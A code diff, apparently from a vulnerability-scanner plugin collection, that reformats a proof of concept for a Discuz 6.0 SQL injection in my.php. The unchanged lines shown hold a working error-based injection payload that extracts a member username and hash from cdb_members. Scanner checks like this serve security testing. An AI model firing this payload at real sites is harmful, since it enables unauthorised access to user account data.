@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Discuz_0042_L'  # 平台漏洞编号，留空
     name = 'Discuz 6.0 SQL注入'  # 漏洞名称
@@ -33,29 +34,30 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #首先注册用户。
-            #获取cookies
+            # 首先注册用户。
+            # 获取cookies
             cookies = {}
             '''
             raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
             for line in raw_cookies.split(';'):  
                 key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                 cookies[key]=value 
-            ''' 
+            '''
             payload = "/my.php?item=buddylist[' and(select 1 from(select count(*),concat((select(select concat(0x7c,username,0x7c,md5(c),0x7c) from cdb_members limit 0,1) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23]=1"
             data = "formhash=698a7245&buddysubmit=%E6%8F%90+%C2%A0+%E4%BA%A4"
             url = self.target + payload
             r = requests.post(url, cookies=cookies, data=data)
-             
+
             if '4a8a08f09d37b73795649038408b5f33' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
-                
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
